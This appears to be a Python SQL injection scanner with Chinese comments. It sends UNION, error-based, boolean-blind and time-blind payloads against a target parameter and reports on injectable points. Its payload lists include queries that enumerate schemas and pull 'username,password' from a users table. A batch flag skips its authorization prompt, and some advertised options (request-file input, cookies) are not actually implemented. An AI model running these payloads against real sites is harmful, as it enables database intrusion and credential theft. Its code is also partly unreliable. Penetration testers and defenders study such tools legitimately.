#!/usr/bin/env python3
"""
Purpose: SQL 注入自动化检测脚本
         支持：联合注入、盲注（布尔/时间）、报错注入、WAF 绕过测试
Auth: 仅限授权使用 — 未经书面授权禁止对任何目标执行检测
Dependencies: requests, urllib3, colorama
Usage:
    python sqli_detector.py -u "http://target/page?id=1" -p id --level 3
    python sqli_detector.py -r request.txt --batch
"""

import argparse
import logging
import sys
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import List, Optional

import requests
from urllib3.exceptions import InsecureRequestWarning

# 禁用 SSL 警告（测试环境用）
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class InjectionType(Enum):
    """SQL 注入类型枚举"""
    UNION = "union"
    ERROR_BASED = "error_based"
    BOOLEAN_BLIND = "boolean_blind"
    TIME_BLIND = "time_blind"
    STACKED = "stacked"


class RiskLevel(Enum):
    """风险等级"""
    INFO = "info"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


@dataclass
class InjectionResult:
    """注入检测结果"""
    url: str
    parameter: str
    injection_type: InjectionType
    risk_level: RiskLevel
    payload: str
    evidence: str = ""
    dbms: Optional[str] = None
    extractable_data: bool = False


@dataclass
class DetectionConfig:
    """检测配置"""
    timeout: int = 10
    delay: float = 0.5           # 请求间隔（秒）
    level: int = 1               # 检测等级 1-5
    retries: int = 2
    verify_ssl: bool = False
    proxy: Optional[str] = None
    user_agent: str = "SQLiDetector/1.0"
    cookies: Optional[dict] = None
    headers: Optional[dict] = None


# ============================================================
# Payload 数据库 — 按注入类型和 DBMS 分类
# ============================================================

UNION_PAYLOADS: List[str] = [
    # --- 基础探测（用于判断列数）---
    "' ORDER BY 1--",
    "' ORDER BY 2--",
    "' ORDER BY 3--",
    "' ORDER BY 4--",
    "' ORDER BY 5--",
    "' ORDER BY 6--",
    "' ORDER BY 7--",
    "' ORDER BY 8--",
    "' ORDER BY 9--",
    "' ORDER BY 10--",
    "' ORDER BY 15--",
    "' ORDER BY 20--",
    "' ORDER BY 100--",  # 探测上限
    
    # --- NULL 注入（确认 UNION 注入点）---
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    
    # --- 数据提取（假设 3 列，中间列可回显）---
    "' UNION SELECT NULL,version(),NULL--",
    "' UNION SELECT NULL,user(),NULL--",
    "' UNION SELECT NULL,database(),NULL--",
    "' UNION SELECT NULL,@@version,NULL--",              # MySQL
    "' UNION SELECT NULL,@@datadir,NULL--",             # MySQL
    "' UNION SELECT NULL,@@hostname,NULL--",            # MySQL
    "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--",
    "' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
    "' UNION SELECT NULL,username,password,NULL FROM users--",
]

ERROR_PAYLOADS: List[str] = [
    # --- MySQL 错误注入 ---
    "' AND 1=extractvalue(1, concat(0x7e, (SELECT version()), 0x7e))--",
    "' AND 1=updatexml(1, concat(0x7e, (SELECT database()), 0x7e), 1)--",
    "' AND (SELECT 1 FROM(SELECT count(*),concat((SELECT version()),0x7e,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND extractvalue(1, concat(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 1), 0x7e))--",
    
    # --- MSSQL 错误注入 ---
    "' AND 1=convert(int,(SELECT TOP 1 name FROM sys.databases))--",
    "' AND 1=cast((SELECT @@version) as int)--",
    "' AND 1=convert(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "' AND 1=convert(int,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users'))--",
    
    # --- PostgreSQL 错误注入 ---
    "' AND 1=cast((SELECT version()) as int)--",
    "' AND 1=cast((SELECT current_database()) as int)--",
    "' AND 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1) as int)--",
    "' AND 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1) as int)--",
    
    # --- Oracle 错误注入 ---
    "' AND 1=ctxsys.drithsx.sn(user,(select banner from v$version where rownum=1))--",
    "' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE rownum=1))--",
    "' AND 1=(SELECT UPPER(XMLType(chr(60)||chr(58)||(SELECT user FROM dual)||chr(62))) FROM dual)--",
    
    # --- SQLite 错误注入 ---
    "' AND 1=cast(sqlite_version() as int)--",
    "' AND 1=cast((SELECT sql FROM sqlite_master LIMIT 1) as int)--",
]

BOOLEAN_PAYLOADS: List[str] = [
    # --- 基础探测 ---
    " AND 1=1--",
    " AND 1=2--",
    " AND 2=2--",
    " AND 3=3--",
    "' AND '1'='1--",
    "' AND '1'='2--",
    
    # --- 版本探测 ---
    " AND SUBSTRING(@@version,1,1)='5'--",          # MySQL
    " AND ascii(substring(@@version,1,1))=53--",   # MySQL
    "' AND ascii(substring(user(),1,1))=114--",   # 'r' for root
    "' AND ascii(substring(database(),1,1))>96--",
    
    # --- 数据库探测 ---
    " AND (SELECT COUNT(*) FROM information_schema.tables)>0--",  # MySQL/PG/MSSQL
    " AND (SELECT COUNT(*) FROM sqlite_master)>0--",                # SQLite
    " AND (SELECT COUNT(*) FROM all_tables)>0--",                    # Oracle
    
    # --- 表探测 ---
    " AND (SELECT COUNT(*) FROM users)>0--",
    " AND (SELECT COUNT(*) FROM admin)>0--",
    " AND (SELECT COUNT(*) FROM accounts)>0--",
    
    # --- Oracle 特有 ---
    "' AND 1=(SELECT 1 FROM dual WHERE rownum=1)--",
    "' AND ascii(substr(user,1,1))>64--",
]

TIME_PAYLOADS: List[str] = [
    # --- MySQL ---
    "' AND SLEEP(5)--",
    "' AND (SELECT SLEEP(5))--",
    "' AND BENCHMARK(50000000,MD5('test'))--",  # CPU 消耗型
    "' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C) AND SLEEP(5)--",
    
    # --- MSSQL ---
    "'; WAITFOR DELAY '0:0:5'--",
    "'; WAITFOR DELAY '00:00:05'--",
    "'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--",
    
    # --- PostgreSQL ---
    "'; SELECT pg_sleep(5)--",
    "'; SELECT * FROM users WHERE 1=1; SELECT pg_sleep(5)--",
    
    # --- SQLite ---
    "'; SELECT CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN (SELECT sqlite_sleep(5)) ELSE 0 END--",
    
    # --- Oracle ---
    "'; BEGIN DBMS_LOCK.SLEEP(5); END--",
    "'; EXEC DBMS_LOCK.SLEEP(5)--",
    "'; SELECT COUNT(*) FROM all_tables WHERE rownum=1 AND DBMS_LOCK.SLEEP(5)=0--",
    
    # --- 通用（依赖响应时间差异）---
    "' AND (SELECT 1 FROM pg_sleep(5))--",
    "' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
]

DBMS_FINGERPRINT: dict = {
    "mysql": {
        "errors": [
            "you have an error in your sql syntax",
            "mysql_fetch",
            "mysql_num_rows",
            "mysqli_fetch",
            "SQL syntax.*MySQL",
            "Warning.*mysql_",
            "MySqlClient",
        ],
        "functions": ["version()", "database()", "user()", "@@version", "@@datadir", "SLEEP()", "BENCHMARK()"],
        "comments": ["--", "#", "/* */"],
        "concat": ["CONCAT()", "GROUP_CONCAT()"],
    },
    "mssql": {
        "errors": [
            "unclosed quotation mark",
            "incorrect syntax near",
            "microsoft ole db provider for sql server",
            "sql server\u2019",
            "expected expression",
            "microsoft sql server",
        ],
        "functions": ["@@version", "db_name()", "user_name()", "WAITFOR DELAY", "CHAR()", "CONVERT()"],
        "comments": ["--", "/* */"],
        "concat": ["+", "CONCAT()"],
    },
    "postgresql": {
        "errors": [
            "postgresql query failed",
            "pg_query",
            "pg_exec",
            "postgresql.*error",
            "fatal error",
        ],
        "functions": ["version()", "current_database()", "current_user", "pg_sleep()", "CHR()", "CAST()"],
        "comments": ["--", "/* */"],
        "concat": ["||", "CONCAT()"],
    },
    "oracle": {
        "errors": [
            "ora-",
            "oracle error",
            "oci_execute",
            "ora-01756",
            "ora-00936",
            "quoted string not properly terminated",
        ],
        "functions": ["SYS_CONTEXT", "USER", "UTL_INADDR", "DBMS_LOCK", "TO_CHAR()", "CHR()"],
        "comments": ["--", "/* */"],
        "concat": ["||"],
    },
    "sqlite": {
        "errors": [
            "sqlite\/sqlite3",
            "sqlite3_exec",
            "sqlite3_prepare",
            "sqlite3_result",
            "database is locked",
        ],
        "functions": ["sqlite_version()", "sql_master"],
        "comments": ["--", "/* */"],
        "concat": ["||", "CONCAT()"],
    },
}


class SQLiDetector:
    """SQL 注入检测器核心类"""

    def __init__(self, config: DetectionConfig):
        self.config = config
        self.session = requests.Session()
        self.results: List[InjectionResult] = []
        self._setup_session()

    def _setup_session(self):
        """配置 HTTP 会话"""
        self.session.verify = self.config.verify_ssl
        self.session.headers.update({"User-Agent": self.config.user_agent})
        if self.config.cookies:
            self.session.cookies.update(self.config.cookies)
        if self.config.headers:
            self.session.headers.update(self.config.headers)
        if self.config.proxy:
            self.session.proxies = {"http": self.config.proxy, "https": self.config.proxy}

    # ----------------------------------------------------------
    # 检测引擎
    # ----------------------------------------------------------

    def detect(self, url: str, parameter: str, method: str = "GET") -> List[InjectionResult]:
        """
        对指定 URL 参数执行完整的 SQL 注入检测流程

        Args:
            url: 目标 URL
            parameter: 待测参数名
            method: HTTP 方法 (GET/POST)

        Returns:
            检测结果列表
        """
        self._url = url
        self._param = parameter
        self._method = method

        # 1. 基础探测 — 发送异常字符观察响应变化
        logging.info(f"[*] 开始检测: {url} 参数: {parameter}")
        baseline = self._send_request(url, parameter, "1", method)
        if baseline is None:
            logging.error("[!] 无法连接目标，检测中止")
            return self.results

        self._baseline_length = len(baseline.text)
        self._baseline_text = baseline.text.lower()
        self._baseline_status = baseline.status_code
        logging.info(f"[*] 基准响应: status={baseline.status_code} length={self._baseline_length}")

        # 2. 基础异常探测 — 单引号触发 SQL 错误
        probe_resp = self._send_request(url, parameter, "1'", method)
        if probe_resp and self._is_waf_blocked(probe_resp):
            logging.warning("[!] 检测到 WAF，尝试绕过...")
        sql_error = probe_resp and self._has_sql_error(probe_resp.text)
        if sql_error:
            logging.info("[+] 检测到 SQL 错误信息，确认存在注入点")

        # 3. DBMS 指纹识别
        dbms = self._fingerprint_dbms(url, parameter)
        if dbms:
            logging.info(f"[+] 识别到数据库类型: {dbms}")

        # 4. 按优先级尝试各注入类型
        if self.config.level >= 1:
            result = self._test_error_injection(url, parameter)
            if result:
                self.results.append(result)

        if self.config.level >= 1:
            result = self._test_union_injection(url, parameter)
            if result:
                self.results.append(result)

        if self.config.level >= 2:
            result = self._test_boolean_blind(url, parameter)
            if result:
                self.results.append(result)

        if self.config.level >= 3:
            result = self._test_time_blind(url, parameter)
            if result:
                self.results.append(result)

        logging.info(f"[*] 检测完成，发现 {len(self.results)} 个注入点")
        return self.results

    def _test_union_injection(self, url: str, param: str) -> Optional[InjectionResult]:
        """测试联合注入"""
        logging.info("[*] 测试 UNION 注入...")

        # Step 1: ORDER BY 探测列数
        max_cols = min(10 + self.config.level * 5, 30)
        col_count = None
        for n in range(1, max_cols + 1):
            payload = f"' ORDER BY {n}--"
            resp = self._send_request(url, param, payload)
            if resp is None:
                continue
            # ORDER BY 成功时通常返回 200 且内容与基准相似
            # 超出列数时返回错误
            if self._has_sql_error(resp.text) or resp.status_code != self._baseline_status:
                col_count = n - 1
                break
            time.sleep(self.config.delay)

        if not col_count or col_count < 1:
            logging.info("[-] ORDER BY 未探测到有效列数")
            return None

        logging.info(f"[+] ORDER BY 探测到 {col_count} 列")

        # Step 2: UNION SELECT NULL 验证
        nulls = ",".join(["NULL"] * col_count)
        payload = f"' UNION SELECT {nulls}--"
        resp = self._send_request(url, param, payload)
        if resp is None:
            return None

        if self._has_sql_error(resp.text) or resp.status_code != self._baseline_status:
            logging.info("[-] UNION SELECT NULL 失败")
            return None

        # Step 3: 确认可回显列位置（用标记字符串替换 NULL）
        marker = "SQLI_MARKER"
        for i in range(col_count):
            cols = ["NULL"] * col_count
            cols[i] = f"'{marker}'"
            payload = f"' UNION SELECT {','.join(cols)}--"
            resp = self._send_request(url, param, payload)
            if resp and marker in resp.text:
                logging.info(f"[+] UNION 注入确认！可回显列位置: {i+1}")
                return InjectionResult(
                    url=url,
                    parameter=param,
                    injection_type=InjectionType.UNION,
                    risk_level=RiskLevel.HIGH,
                    payload=payload,
                    evidence=f"Column {i+1} echoable, total {col_count} columns",
                    dbms=self._fingerprint_dbms(url, param),
                    extractable_data=True,
                )
            time.sleep(self.config.delay)

        return None

    def _test_error_injection(self, url: str, param: str) -> Optional[InjectionResult]:
        """测试报错注入"""
        logging.info("[*] 测试报错注入...")

        for payload in ERROR_PAYLOADS:
            resp = self._send_request(url, param, payload)
            if resp is None:
                continue

            text = resp.text
            # 检查响应中是否包含数据库信息（版本号、表名等）
            db_info_patterns = [
                r"\d+\.\d+\.\d+",                          # 版本号
                r"information_schema",
                r"(mysql|mssql|postgresql|oracle|sqlite)",  # DBMS 名称
                r"XPATH syntax error",
                r"extractvalue",
                r"updatexml",
                r"Conversion failed",
                r"ORA-\d{5}",
            ]
            import re
            for pattern in db_info_patterns:
                match = re.search(pattern, text, re.IGNORECASE)
                if match:
                    logging.info(f"[+] 报错注入确认！payload: {payload[:50]}...")
                    return InjectionResult(
                        url=url,
                        parameter=param,
                        injection_type=InjectionType.ERROR_BASED,
                        risk_level=RiskLevel.HIGH,
                        payload=payload,
                        evidence=f"DB info leaked: {match.group()}",
                        dbms=self._fingerprint_dbms(url, param),
                        extractable_data=True,
                    )
            time.sleep(self.config.delay)

        return None

    def _test_boolean_blind(self, url: str, param: str) -> Optional[InjectionResult]:
        """测试布尔盲注"""
        logging.info("[*] 测试布尔盲注...")

        # 对比 true/false 条件的响应
        true_payloads = [" AND 1=1--", "' AND '1'='1--"]
        false_payloads = [" AND 1=2--", "' AND '1'='2--"]

        for true_p, false_p in zip(true_payloads, false_payloads):
            true_resp = self._send_request(url, param, true_p)
            false_resp = self._send_request(url, param, false_p)

            if true_resp is None or false_resp is None:
                continue

            # 比较响应差异：长度差异、状态码差异、内容差异
            length_diff = abs(len(true_resp.text) - len(false_resp.text))
            status_diff = true_resp.status_code != false_resp.status_code

            # 有效差异：长度差 > 5% 基准长度，或状态码不同
            threshold = self._baseline_length * 0.05
            if length_diff > max(threshold, 50) or status_diff:
                # 二次确认：用另一个 true 条件验证
                verify_true = self._send_request(url, param, " AND 2=2--")
                if verify_true and abs(len(verify_true.text) - len(true_resp.text)) < max(threshold, 50):
                    logging.info(f"[+] 布尔盲注确认！true/false 响应差异显著")
                    return InjectionResult(
                        url=url,
                        parameter=param,
                        injection_type=InjectionType.BOOLEAN_BLIND,
                        risk_level=RiskLevel.MEDIUM,
                        payload=f"true: {true_p}, false: {false_p}",
                        evidence=f"Length diff: {length_diff}, status_diff: {status_diff}",
                        dbms=self._fingerprint_dbms(url, param),
                    )
            time.sleep(self.config.delay)

        return None

    def _test_time_blind(self, url: str, param: str) -> Optional[InjectionResult]:
        """测试时间盲注"""
        logging.info("[*] 测试时间盲注...")

        # 测量基准响应时间
        baseline_times = []
        for _ in range(3):
            resp = self._send_request(url, param, "1")
            if resp:
                baseline_times.append(resp.elapsed.total_seconds())
        if not baseline_times:
            return None
        avg_baseline = sum(baseline_times) / len(baseline_times)
        logging.info(f"[*] 基准响应时间: {avg_baseline:.2f}s")

        delay_seconds = max(5, int(avg_baseline * 3))  # 至少 5 秒延迟

        for payload_template in TIME_PAYLOADS:
            # 替换 SLEEP 值
            payload = payload_template.replace("5)", f"{delay_seconds})")
            payload = payload.replace("'0:0:5'", f"'0:0:{delay_seconds}'")
            payload = payload.replace("'00:00:05'", f"'00:00:{delay_seconds:02d}'")

            start = time.time()
            resp = self._send_request(url, param, payload)
            elapsed = time.time() - start

            if resp and elapsed >= (avg_baseline + delay_seconds * 0.8):
                # 二次确认
                start2 = time.time()
                self._send_request(url, param, payload)
                elapsed2 = time.time() - start2

                if elapsed2 >= (avg_baseline + delay_seconds * 0.8):
                    logging.info(f"[+] 时间盲注确认！延迟 {elapsed:.1f}s / {elapsed2:.1f}s")
                    return InjectionResult(
                        url=url,
                        parameter=param,
                        injection_type=InjectionType.TIME_BLIND,
                        risk_level=RiskLevel.MEDIUM,
                        payload=payload,
                        evidence=f"Delay: {elapsed:.1f}s / {elapsed2:.1f}s (baseline: {avg_baseline:.2f}s)",
                        dbms=self._fingerprint_dbms(url, param),
                    )
            time.sleep(self.config.delay)

        return None

    def _fingerprint_dbms(self, url: str, param: str) -> Optional[str]:
        """识别后端数据库类型"""
        # 方法1: 基于错误信息中的关键词
        probe_payloads = ["'", "'", "\"\"", "')", "' OR 1=1--"]
        for payload in probe_payloads:
            resp = self._send_request(url, param, payload)
            if resp and resp.text:
                text_lower = resp.text.lower()
                for dbms, fingerprint in DBMS_FINGERPRINT.items():
                    for err_pattern in fingerprint.get("errors", []):
                        if err_pattern.lower() in text_lower:
                            return dbms

        # 方法2: 基于特定函数的响应差异
        version_tests = {
            "mysql": "' AND SUBSTRING(@@version,1,1)='5'--",
            "mssql": "' AND SUBSTRING(@@version,1,1)='1'--",
            "postgresql": "' AND SUBSTRING(version(),1,1)='1'--",
            "sqlite": "' AND sqlite_version()>'0'--",
        }
        # 注意：此方法依赖布尔盲注已确认，否则不可靠
        return None

    def _send_request(self, url: str, param: str, payload: str, method: str = None) -> Optional[requests.Response]:
        """发送带 payload 的请求"""
        method = method or self._method if hasattr(self, '_method') else "GET"
        time.sleep(self.config.delay)
        try:
            if method.upper() == "GET":
                from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                params[param] = [payload]
                new_query = urlencode(params, doseq=True)
                new_url = urlunparse(parsed._replace(query=new_query))
                resp = self.session.get(new_url, timeout=self.config.timeout)
            else:
                resp = self.session.post(url, data={param: payload}, timeout=self.config.timeout)
            return resp
        except requests.RequestException as e:
            logging.debug(f"Request failed: {e}")
            return None

    def _is_waf_blocked(self, response: requests.Response) -> bool:
        """检测是否被 WAF 拦截"""
        waf_signatures = {
            "cloudflare": ["cf-ray", "cloudflare"],
            "modsecurity": ["mod_security", "modsecurity"],
            "aws_waf": ["awselb", "x-amzn-requestid"],
            "akamai": ["akamai"],
            "imperva": ["x-iinfo", "incap_ses"],
            "f5_bigip": ["x-wa-info", "bigip"],
        }
        # 检查状态码
        if response.status_code in (403, 406, 429, 501):
            text_lower = response.text.lower()
            for waf, sigs in waf_signatures.items():
                for sig in sigs:
                    if sig in text_lower or sig in [v.lower() for v in response.headers.values()]:
                        logging.info(f"[!] 检测到 WAF: {waf}")
                        return True
        # 检查响应头
        for header, value in response.headers.items():
            h_lower = f"{header}: {value}".lower()
            for waf, sigs in waf_signatures.items():
                for sig in sigs:
                    if sig in h_lower:
                        return True
        return False

    def _has_sql_error(self, text: str) -> bool:
        """检查响应中是否包含 SQL 错误特征"""
        text_lower = text.lower()
        error_patterns = [
            "sql syntax", "mysql_fetch", "mysql_num_rows", "mysqli_",
            "pg_query", "pg_exec", "postgresql",
            "ora-", "oracle error", "oci_execute",
            "microsoft ole db", "odbc", "sql server",
            "sqlite3_", "sqlite error",
            "unclosed quotation mark", "incorrect syntax near",
            "quoted string not properly terminated",
            "you have an error in your sql",
            "warning: mysql", "warning: pg_",
            "sqlstate", "odbc driver",
        ]
        return any(p in text_lower for p in error_patterns)

    # ----------------------------------------------------------
    # 输出与报告
    # ----------------------------------------------------------

    def print_results(self):
        """格式化输出检测结果"""
        if not self.results:
            print("\n[-] 未发现 SQL 注入漏洞")
            return

        print(f"\n{'='*60}")
        print(f"  SQL 注入检测报告")
        print(f"{'='*60}")
        for i, r in enumerate(self.results, 1):
            print(f"\n  [{i}] {r.injection_type.value.upper()} Injection")
            print(f"  风险等级: {r.risk_level.value.upper()}")
            print(f"  参数: {r.parameter}")
            print(f"  Payload: {r.payload[:80]}{'...' if len(r.payload)>80 else ''}")
            if r.evidence:
                print(f"  证据: {r.evidence}")
            if r.dbms:
                print(f"  DBMS: {r.dbms}")
            if r.extractable_data:
                print(f"  数据提取: 可")
        print(f"\n{'='*60}")

    def export_json(self, filepath: str):
        """导出 JSON 格式报告"""
        data = {
            "results": [
                {
                    "url": r.url,
                    "parameter": r.parameter,
                    "type": r.injection_type.value,
                    "risk": r.risk_level.value,
                    "payload": r.payload,
                    "evidence": r.evidence,
                    "dbms": r.dbms,
                    "extractable": r.extractable_data,
                }
                for r in self.results
            ]
        }
        import json
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        logging.info(f"[+] 报告已导出: {filepath}")

    def export_html(self, filepath: str):
        """导出 HTML 格式报告"""
        rows = ""
        for i, r in enumerate(self.results, 1):
            color = {"critical": "#c0392b", "high": "#e74c3c", "medium": "#f39c12", "low": "#3498db", "info": "#95a5a6"}.get(r.risk_level.value, "#95a5a6")
            rows += f"""
            <tr>
                <td>{i}</td>
                <td style=\"color:{color};font-weight:bold\">{r.risk_level.value.upper()}</td>
                <td>{r.injection_type.value}</td>
                <td><code>{r.payload[:80]}</code></td>
                <td>{r.evidence or '-'}</td>
                <td>{r.dbms or '-'}</td>
            </tr>"""
        html = f"""<!DOCTYPE html>
<html><head><meta charset=\"utf-8\"><title>SQLi Report</title>
<style>body{{font-family:sans-serif;margin:40px}}table{{border-collapse:collapse;width:100%}}th,td{{border:1px solid #ddd;padding:8px;text-align:left}}th{{background:#2c3e50;color:white}}</style>
</head><body><h1>SQL Injection Report</h1><p>Found: {len(self.results)} injection(s)</p>
<table><tr><th>#</th><th>Risk</th><th>Type</th><th>Payload</th><th>Evidence</th><th>DBMS</th></tr>{rows}</table></body></html>"""
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(html)
        logging.info(f"[+] HTML 报告已导出: {filepath}")


def main():
    parser = argparse.ArgumentParser(
        description="SQL 注入自动化检测工具（仅限授权使用）",
        epilog="⚠️  未经授权使用本工具属于违法行为"
    )
    parser.add_argument("-u", "--url", required=True, help="目标 URL")
    parser.add_argument("-p", "--parameter", required=True, help="待测参数")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"])
    parser.add_argument("--level", type=int, default=1, choices=range(1, 6), help="检测等级 1-5")
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--delay", type=float, default=0.5, help="请求间隔秒数")
    parser.add_argument("--proxy", help="代理地址 (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--cookie", help="Cookie 字符串")
    parser.add_argument("-o", "--output", help="输出文件路径 (支持 .json/.html)")
    parser.add_argument("--batch", action="store_true", help="批处理模式，不询问确认")

    args = parser.parse_args()

    # 授权确认
    if not args.batch:
        print("⚠️  请确认你已获得目标系统的书面授权")
        confirm = input("确认已获授权？(y/N): ")
        if confirm.lower() != "y":
            sys.exit(0)

    config = DetectionConfig(
        timeout=args.timeout,
        delay=args.delay,
        level=args.level,
        proxy=args.proxy,
    )

    detector = SQLiDetector(config)
    results = detector.detect(args.url, args.parameter, args.method)
    detector.print_results()

    if args.output:
        if args.output.endswith(".json"):
            detector.export_json(args.output)
        elif args.output.endswith(".html"):
            detector.export_html(args.output)


if __name__ == "__main__":
    main()
